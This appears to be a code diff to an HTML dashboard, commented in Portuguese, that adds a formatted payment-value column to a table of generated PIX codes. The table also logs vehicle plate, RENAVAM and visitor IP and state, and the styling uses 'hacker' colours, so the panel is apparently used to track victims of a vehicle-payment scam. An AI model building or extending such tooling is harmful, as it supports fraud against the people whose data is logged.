@@ -856,7 +856,7 @@
                 </div>
             </div>
             
-            <!-- SEÇÃO: PIX GERADOS -->
+            <!-- SEÇÃO: PIX GERADOS (COM CORREÇÃO 1: VALOR NA TABELA) -->
             <div id="section-pix" class="dashboard-section hidden">
                 <div class="section-header">
                     <div class="section-title">
@@ -899,6 +899,7 @@
                             <tr>
                                 <th>Data/Hora</th>
                                 <th>Tipo</th>
+                                <!-- CORREÇÃO 1: COLUNA VALOR ADICIONADA -->
                                 <th>Valor</th>
                                 <th>Placa</th>
                                 <th>RENAVAM</th>
@@ -1566,7 +1567,7 @@
         }
         
         // ============================================
-        // CARREGAR PIX COMPLETOS (BANCO DE DADOS)
+        // CARREGAR PIX COMPLETOS (BANCO DE DADOS) - COM CORREÇÃO 1
         // ============================================
         async function carregarPixCompletos() {
             const loading = document.getElementById('pixLoading');
@@ -1621,6 +1622,10 @@
                 else if (pix.tipo === 'copiado') tipoBadge = '<span class="status-badge warning">Copiado</span>';
                 else if (pix.tipo === 'real') tipoBadge = '<span class="status-badge info">Real</span>';
                 
+                // CORREÇÃO 1: VALOR DO PIX FORMATADO
+                const valorFormatado = pix.valorFormatado || 
+                                      `R$ ${parseFloat(pix.valor || 0).toFixed(2).replace('.', ',')}`;
+                
                 // CORREÇÃO 5: Categoria
                 const categoria = pix.categoria || (pix.tipo === 'copiado' ? 'copiado' : 'gerado');
                 const categoriaBadge = categoria === 'copiado' 
@@ -1631,7 +1636,8 @@
                     <tr>
                         <td>${new Date(pix.dataHora).toLocaleString('pt-BR')}</td>
                         <td>${tipoBadge}</td>
-                        <td><strong style="color: ${categoria === 'copiado' ? 'var(--hacker-purple)' : 'var(--hacker-cyan)'};">R$ ${parseFloat(pix.valor || 0).toFixed(2).replace('.', ',')}</strong></td>
+                        <!-- CORREÇÃO 1: VALOR DO PIX NA TABELA -->
+                        <td><strong style="color: ${categoria === 'copiado' ? 'var(--hacker-purple)' : 'var(--hacker-cyan)'};">${valorFormatado}</strong></td>
                         <td>${pix.placa || 'N/A'}</td>
                         <td>${pix.renavam || 'N/A'}</td>
                         <!-- CORREÇÃO 3: IP COMPLETO + ESTADO -->
